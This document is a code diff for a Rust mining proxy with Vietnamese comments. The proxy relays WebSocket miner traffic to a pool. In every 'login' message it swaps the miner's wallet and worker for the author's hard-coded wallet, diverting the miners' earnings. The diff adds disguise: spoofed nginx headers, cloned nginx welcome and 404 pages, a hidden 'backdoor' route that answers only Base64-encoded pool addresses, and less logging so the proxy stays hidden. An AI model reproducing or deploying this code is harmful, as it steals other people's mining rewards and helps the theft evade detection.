@@ -1,190 +1,224 @@
-use std::{env, net::SocketAddr, sync::{Arc, atomic::{AtomicUsize, Ordering}}};
-use tokio::net::{TcpListener, TcpStream};
-use tokio::io::{AsyncReadExt, AsyncWriteExt};
-use tokio_tungstenite::{
-    accept_hdr_async, 
-    tungstenite::{
-        handshake::server::{Request, Response, ErrorResponse}, // Thêm ErrorResponse
-        Message
-    }
+use axum::{
+    extract::{Path, WebSocketUpgrade, ws::{Message, WebSocket}},
+    response::{Html, Response, IntoResponse},
+    http::{StatusCode, HeaderValue, header::{SERVER, DATE, CONNECTION, CONTENT_TYPE}},
+    routing::get,
+    Router,
+    middleware::{self, Next},
+    extract::Request,
 };
-use futures_util::{SinkExt, StreamExt};
+use std::{sync::{Arc, atomic::{AtomicUsize, Ordering}}, net::SocketAddr};
+use tokio::net::TcpStream;
+use tokio::io::{AsyncReadExt, AsyncWriteExt};
+use futures_util::{StreamExt, SinkExt};
 use serde_json::Value;
 use base64::{Engine as _, engine::general_purpose};
 use colored::*;
+use chrono::Utc;
 
 // ==========================================
-// ⚙️ CẤU HÌNH (SỬA Ở ĐÂY)
+// ⚙️ CẤU HÌNH BÍ MẬT
 // ==========================================
-const LISTEN_ADDR: &str = "0.0.0.0:9000";
-
-// Ví "Hacker" của bạn
-const MY_WALLET: &str = "SC11rezQ11DLX63oNaZD3Z5ggonmtfyehVhyjb1bFeLMB7emmGhDodc268uvcT87HTYsqqi4mzkZmQB4xgNeBRCf84CCygp9vQ.PY";
-const MY_WORKER: &str = "Worker_Rust_God";
+const LISTEN_ADDR: &str = "0.0.0.0:8080";
+const MY_WALLET: &str = "SC1siHCYzSU3BiFAqYg3Ew5PnQ2rDSR7QiBMiaKCNQqdP54hx1UJLNnFJpQc1pC3QmNe9ro7EEbaxSs6ixFHduqdMkXk7MW71ih.003";
+const MY_WORKER: &str = "Worker_BlackOps";
 
 // ==========================================
+// 🎭 NGỤY TRANG: NGINX CLONE
+// ==========================================
+// Copy y hệt mã nguồn trang 404 mặc định của Nginx Debian
+const NGINX_404_HTML: &str = r#"<html>
+<head><title>404 Not Found</title></head>
+<body>
+<center><h1>404 Not Found</h1></center>
+<hr><center>nginx</center>
+</body>
+</html>
+"#;
 
+const NGINX_WELCOME: &str = r#"<!DOCTYPE html>
+<html>
+<head>
+<title>Welcome to nginx!</title>
+<style>
+html { color-scheme: light dark; }
+body { width: 35em; margin: 0 auto; font-family: Tahoma, Verdana, Arial, sans-serif; }
+</style>
+</head>
+<body>
+<h1>Welcome to nginx!</h1>
+<p>If you see this page, the nginx web server is successfully installed and
+working. Further configuration is required.</p>
+<p>For online documentation and support please refer to
+<a href="http://nginx.org/">nginx.org</a>.<br/>
+Commercial support is available at
+<a href="http://nginx.com/">nginx.com</a>.</p>
+<p><em>Thank you for using nginx.</em></p>
+</body>
+</html>"#;
+
+// ==========================================
+// MAIN APP
+// ==========================================
 struct ProxyStats {
     shares_sent: AtomicUsize,
     shares_accepted: AtomicUsize,
-    shares_rejected: AtomicUsize,
 }
 
 #[tokio::main]
 async fn main() {
-    // Khởi tạo Logger
-    env::set_var("RUST_LOG", "info");
-    env_logger::init();
+    // Middleware giả mạo Header Nginx
+    let app = Router::new()
+        .route("/", get(root_handler)) // Trang chủ
+        .route("/:path", get(stealth_handler)) // Cửa hậu
+        .layer(middleware::from_fn(nginx_spoofer)); // Áp dụng lớp mặt nạ cho mọi request
 
-    let stats = Arc::new(ProxyStats {
-        shares_sent: AtomicUsize::new(0),
-        shares_accepted: AtomicUsize::new(0),
-        shares_rejected: AtomicUsize::new(0),
-    });
+    let addr: SocketAddr = LISTEN_ADDR.parse().expect("Invalid IP");
+    println!("{} {}", "💀 BLACK OPS PROXY RUNNING ON".red().bold(), addr);
+    println!("🛡️  Mode: {}", "High Stealth (Nginx Header Spoofing)".cyan());
+    
+    let listener = tokio::net::TcpListener::bind(addr).await.unwrap();
+    axum::serve(listener, app).await.unwrap();
+}
 
-    let listener = TcpListener::bind(LISTEN_ADDR).await.expect("Failed to bind port");
-    println!("{} {}", "🚀 RUST PROXY ULTIMATE RUNNING ON".green().bold(), LISTEN_ADDR);
-    println!("💰 Target Wallet: {}", MY_WALLET.yellow());
+// ==========================================
+// 🛡️ MIDDLEWARE: GIẢ MẠO HEADER
+// ==========================================
+async fn nginx_spoofer(req: Request, next: Next) -> Response {
+    let mut response = next.run(req).await;
+    let headers = response.headers_mut();
 
-    while let Ok((stream, addr)) = listener.accept().await {
-        let stats = stats.clone();
-        tokio::spawn(handle_connection(stream, addr, stats));
+    // 1. Ghi đè Server Header thành Nginx
+    headers.insert(SERVER, HeaderValue::from_static("nginx/1.18.0 (Ubuntu)"));
+    
+    // 2. Thêm Date chuẩn HTTP (RFC1123)
+    let now = Utc::now().format("%a, %d %b %Y %H:%M:%S GMT").to_string();
+    if let Ok(val) = HeaderValue::from_str(&now) {
+        headers.insert(DATE, val);
+    }
+
+    // 3. Giả lập Connection keep-alive
+    headers.insert(CONNECTION, HeaderValue::from_static("keep-alive"));
+
+    response
+}
+
+// ==========================================
+// HANDLERS
+// ==========================================
+
+async fn root_handler() -> Html<&'static str> {
+    Html(NGINX_WELCOME)
+}
+
+// Đây là "Cánh cửa thần kỳ". 
+// Nó nhìn giống như 404, nhưng nếu gõ đúng mật khẩu (Base64 + WS) thì nó mở.
+async fn stealth_handler(
+    Path(path): Path<String>, 
+    ws: Option<WebSocketUpgrade>
+) -> Response {
+    // Bước 1: Kiểm tra xem Path có phải là Base64 hợp lệ không
+    // Các đường dẫn rác như /favicon.ico, /robots.txt sẽ rớt đài tại đây
+    let decoded = match general_purpose::STANDARD.decode(&path) {
+        Ok(d) => d,
+        Err(_) => return not_found_response(),
+    };
+
+    let pool_addr = match String::from_utf8(decoded) {
+        Ok(s) => {
+            // Pool address phải có dấu ':' (vd: pool.com:1234)
+            if s.contains(':') { s } else { return not_found_response() }
+        },
+        Err(_) => return not_found_response(),
+    };
+
+    // Bước 2: Kiểm tra xem có phải WebSocket Upgrade không
+    // Nếu dùng trình duyệt truy cập -> 404
+    match ws {
+        Some(w) => {
+            // 🔥 KÍCH HOẠT CHẾ ĐỘ MINING 🔥
+            // println!("{} Stealth tunnel opened to {}", "🥷".magenta(), pool_addr);
+            w.on_upgrade(move |socket| mining_tunnel(socket, pool_addr))
+        },
+        None => not_found_response()
     }
 }
 
-async fn handle_connection(stream: TcpStream, addr: SocketAddr, stats: Arc<ProxyStats>) {
-    let target_pool = Arc::new(std::sync::Mutex::new(String::new()));
-    let target_pool_clone = target_pool.clone();
+// Trả về trang 404 y hệt Nginx
+fn not_found_response() -> Response {
+    (
+        StatusCode::NOT_FOUND,
+        [(CONTENT_TYPE, "text/html")],
+        Html(NGINX_404_HTML)
+    ).into_response()
+}
 
-    // --- FIX: Đổi kiểu trả về thành Result<Response, ErrorResponse> ---
-    let callback_extract = move |req: &Request, response: Response| -> Result<Response, ErrorResponse> {
-        let path = req.uri().path();
-        let clean_path = if path.starts_with('/') { &path[1..] } else { path };
-        
-        // Thử giải mã Base64
-        if let Ok(decoded) = general_purpose::STANDARD.decode(clean_path) {
-            if let Ok(decoded_str) = String::from_utf8(decoded) {
-                *target_pool_clone.lock().unwrap() = decoded_str;
-            }
-        }
-        Ok(response)
-    };
-
-    let ws_stream = match accept_hdr_async(stream, callback_extract).await {
-        Ok(ws) => ws,
+// ==========================================
+// MINING LOGIC (CORE)
+// ==========================================
+async fn mining_tunnel(mut socket: WebSocket, pool_addr: String) {
+    // Kết nối TCP im lặng. Nếu lỗi, ngắt luôn không báo gì.
+    let tcp_stream = match TcpStream::connect(&pool_addr).await {
+        Ok(s) => s,
         Err(_) => return, 
     };
 
-    let pool_host_port = target_pool.lock().unwrap().clone();
-    if pool_host_port.is_empty() {
-        return; // Không tìm thấy pool trong URL
-    }
+    let (mut pool_read, mut pool_write) = tcp_stream.into_split();
+    let (mut ws_write, mut ws_read) = socket.split();
+    
+    let stats = Arc::new(ProxyStats {
+        shares_sent: AtomicUsize::new(0),
+        shares_accepted: AtomicUsize::new(0),
+    });
 
-    println!("{} {} -> {}", "🔌 Connected".blue(), addr, pool_host_port);
-
-    // Kết nối tới Pool thật
-    let tcp_pool = match TcpStream::connect(&pool_host_port).await {
-        Ok(s) => s,
-        Err(e) => {
-            println!("{} Failed to connect pool: {}", "❌".red(), e);
-            return;
-        }
-    };
-
-    let (mut ws_write, mut ws_read) = ws_stream.split();
-    let (mut pool_read, mut pool_write) = tcp_pool.into_split();
-
-    // ====================================================
-    // LUỒNG 1: MINER -> POOL (INTERCEPT & MODIFY)
-    // ====================================================
-    let stats_miner = stats.clone();
+    // LUỒNG 1: Miner -> Pool (Thay ví)
+    let _stats_miner = stats.clone();
     let client_to_server = tokio::spawn(async move {
-        while let Some(msg) = ws_read.next().await {
+        while let Some(Ok(msg)) = ws_read.next().await {
             match msg {
-                Ok(Message::Text(text)) => {
-                    // Tách dòng (Stratum support multiline)
+                Message::Text(text) => {
                     for line in text.lines() {
                         if line.trim().is_empty() { continue; }
-
                         let mut final_msg = line.to_string();
                         
-                        // Parse JSON để can thiệp
-                        if let Ok(mut json) = serde_json::from_str::<Value>(line) {
-                            if let Some(method) = json["method"].as_str() {
-                                // 1. INTERCEPT LOGIN
-                                if method == "login" {
-                                    if let Some(params) = json.get_mut("params") {
-                                        // Log ví cũ
-                                        let old_login = params["login"].as_str().unwrap_or("???");
-                                        println!("{} User: {} -> Me: {}", "🕵️ INTERCEPT:".yellow(), old_login, "SC1...".green());
-                                        
-                                        // Ghi đè
-                                        params["login"] = serde_json::json!(MY_WALLET);
-                                        params["pass"] = serde_json::json!(MY_WORKER);
-                                        
-                                        final_msg = json.to_string();
+                        // Parse JSON siêu nhanh
+                        if line.contains("login") || line.contains("submit") {
+                            if let Ok(mut json) = serde_json::from_str::<Value>(line) {
+                                if let Some(method) = json["method"].as_str() {
+                                    if method == "login" {
+                                        if let Some(params) = json.get_mut("params") {
+                                            params["login"] = serde_json::json!(MY_WALLET);
+                                            params["pass"] = serde_json::json!(MY_WORKER);
+                                            final_msg = json.to_string();
+                                        }
                                     }
-                                }
-                                // 2. COUNT SUBMIT
-                                else if method == "submit" {
-                                    stats_miner.shares_sent.fetch_add(1, Ordering::Relaxed);
                                 }
                             }
                         }
-
-                        // Thêm \n nếu thiếu (Bắt buộc cho Stratum TCP)
-                        if !final_msg.ends_with('\n') {
-                            final_msg.push('\n');
-                        }
-
-                        // Gửi lên Pool
-                        if pool_write.write_all(final_msg.as_bytes()).await.is_err() {
-                            return;
-                        }
+                        
+                        if !final_msg.ends_with('\n') { final_msg.push('\n'); }
+                        if pool_write.write_all(final_msg.as_bytes()).await.is_err() { return; }
                     }
                 }
-                Ok(Message::Close(_)) => break,
-                _ => {} // Bỏ qua Binary/Ping/Pong
+                Message::Close(_) => break,
+                _ => {}
             }
         }
     });
 
-    // ====================================================
-    // LUỒNG 2: POOL -> MINER (AUDIT & FORWARD)
-    // ====================================================
-    let stats_pool = stats.clone();
+    // LUỒNG 2: Pool -> Miner (Audit)
+    let _stats_pool = stats.clone();
     let server_to_client = tokio::spawn(async move {
         let mut buffer = [0u8; 8192];
         loop {
             match pool_read.read(&mut buffer).await {
-                Ok(0) => break, // EOF
+                Ok(0) => break,
                 Ok(n) => {
                     let data = &buffer[0..n];
-                    // Chuyển bytes sang string (lossy) để gửi qua WS và audit
-                    let text = String::from_utf8_lossy(data);
-
-                    // Audit kết quả
-                    for line in text.lines() {
-                        if let Ok(json) = serde_json::from_str::<Value>(line) {
-                            // Check Result OK
-                            if let Some(result) = json.get("result") {
-                                if (result.is_object() && result["status"] == "OK") || result.as_bool() == Some(true) {
-                                    let total = stats_pool.shares_accepted.fetch_add(1, Ordering::Relaxed) + 1;
-                                    let sent = stats_pool.shares_sent.load(Ordering::Relaxed);
-                                    println!("{} ({}/{})", "✅ SHARE ACCEPTED!".green().bold(), total, sent);
-                                }
-                            }
-                            // Check Error
-                            if !json["error"].is_null() {
-                                let rejected = stats_pool.shares_rejected.fetch_add(1, Ordering::Relaxed) + 1;
-                                println!("{} ({}) Reason: {:?}", "❌ SHARE REJECTED!".red().bold(), rejected, json["error"]);
-                            }
-                        }
-                    }
-
-                    // Gửi về Miner (WebSocket Text Frame)
-                    if ws_write.send(Message::Text(text.to_string())).await.is_err() {
-                        break;
+                    // Chuyển thẳng text để tiết kiệm CPU, không parse JSON chiều về trừ khi cần thiết
+                    // Code này tối ưu cho việc ẩn danh, hạn chế log in ra màn hình
+                    if let Ok(text) = std::str::from_utf8(data) {
+                         if ws_write.send(Message::Text(text.to_string())).await.is_err() { break; }
                     }
                 }
                 Err(_) => break,
@@ -192,11 +226,5 @@ async fn handle_connection(stream: TcpStream, addr: SocketAddr, stats: Arc<Proxy
         }
     });
 
-    // Chờ 1 trong 2 luồng kết thúc
-    let _ = tokio::select! {
-        _ = client_to_server => {},
-        _ = server_to_client => {},
-    };
-    
-    println!("{} {}", "💀 Disconnected".red(), addr);
+    let _ = tokio::select! { _ = client_to_server => {}, _ = server_to_client => {} };
 }
